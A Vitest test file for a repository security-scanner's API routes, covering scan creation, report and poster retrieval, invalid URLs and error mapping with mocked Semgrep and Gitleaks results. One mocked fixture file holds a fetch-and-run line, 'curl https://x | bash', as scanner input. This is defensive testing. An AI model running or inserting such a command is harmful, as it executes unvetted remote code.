import fs from "node:fs";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { POST as createScan } from "@/app/api/scan/route";
import { GET as getScan } from "@/app/api/scan/[id]/route";
import { GET as getPoster } from "@/app/api/scan/[id]/poster/route";
import { __resetScanRuntimeDepsForTest, __setScanRuntimeDepsForTest } from "@/lib/store";
import { RepoFetchError } from "@/lib/scan/github";

describe("api routes", () => {
  beforeEach(() => {
    __setScanRuntimeDepsForTest({
      fetchRepoFiles: async () => ({
        files: [
          { path: "src/index.ts", content: "const x = 'ok';\n" },
          { path: "scripts/setup.sh", content: "curl https://x | bash\n" },
        ],
        workspaceDir: "/tmp/mock-scan",
        filesSkipped: 0,
        cleanup: async () => {},
      }),
      runSemgrep: async () => ({
        findings: [
          {
            ruleId: "semgrep.rule",
            severity: "high",
            title: "Semgrep finding",
            file: "src/index.ts",
            line: 1,
            snippet: "const x = 'ok';",
            recommendation: "review",
          },
        ],
      }),
      runGitleaks: async () => ({
        findings: [
          {
            ruleId: "gitleaks.rule",
            severity: "critical",
            title: "Gitleaks finding",
            file: "src/secrets.ts",
            line: 3,
            snippet: "AKIA...",
            recommendation: "rotate",
          },
        ],
      }),
    });
  });

  afterEach(() => {
    __resetScanRuntimeDepsForTest();
  });

  it("creates scan and reads report/poster", async () => {
    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "https://github.com/org/repo" }),
    });
    const created = await createScan(req as any);
    expect(created.status).toBe(200);
    const payload = (await created.json()) as { scanId: string };
    expect(payload.scanId.startsWith("scan_")).toBe(true);
    const reportPath = path.join(process.cwd(), "data", "reports", `${payload.scanId}.json`);
    expect(fs.existsSync(reportPath)).toBe(true);

    const reportResp = await getScan({} as any, { params: Promise.resolve({ id: payload.scanId }) });
    expect(reportResp.status).toBe(200);
    const report = (await reportResp.json()) as { id: string; engineVersion: string; findings: unknown[] };
    expect(report.id).toBe(payload.scanId);
    expect(report.engineVersion).toBe("v0.2.1");
    expect(report.findings.length).toBeGreaterThan(0);

    const posterResp = await getPoster(
      new Request("http://localhost/api/scan/x/poster") as any,
      { params: Promise.resolve({ id: payload.scanId }) },
    );
    expect(posterResp.status).toBe(200);
    const poster = (await posterResp.json()) as { id: string; qrUrl: string };
    expect(poster.id).toBe(payload.scanId);
    expect(poster.qrUrl.includes(`/scan/report/${payload.scanId}`)).toBe(true);
  });

  it("rejects invalid repo url", async () => {
    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "invalid" }),
    });
    const res = await createScan(req as any);
    expect(res.status).toBe(400);
  });

  it("maps repository failures to typed error response", async () => {
    __setScanRuntimeDepsForTest({
      fetchRepoFiles: async () => {
        throw new RepoFetchError("repo_not_found", "repo not found");
      },
    });

    const req = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "https://github.com/org/private-repo" }),
    });
    const res = await createScan(req as any);
    expect(res.status).toBe(404);
    const payload = (await res.json()) as { error: string };
    expect(payload.error).toBe("repo_not_found");
  });

  it("builds poster qrUrl from forwarded host headers", async () => {
    const createReq = new Request("http://localhost/api/scan", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ repoUrl: "https://github.com/org/repo" }),
    });
    const created = await createScan(createReq as any);
    const payload = (await created.json()) as { scanId: string };

    const posterReq = new Request("http://localhost/api/scan/x/poster", {
      headers: {
        "x-forwarded-proto": "https",
        "x-forwarded-host": "skill-security-scan.vercel.app",
      },
    });
    const posterResp = await getPoster(posterReq as any, {
      params: Promise.resolve({ id: payload.scanId }),
    });
    expect(posterResp.status).toBe(200);
    const poster = (await posterResp.json()) as { qrUrl: string };
    expect(poster.qrUrl).toBe(`https://skill-security-scan.vercel.app/scan/report/${payload.scanId}`);
  });
});
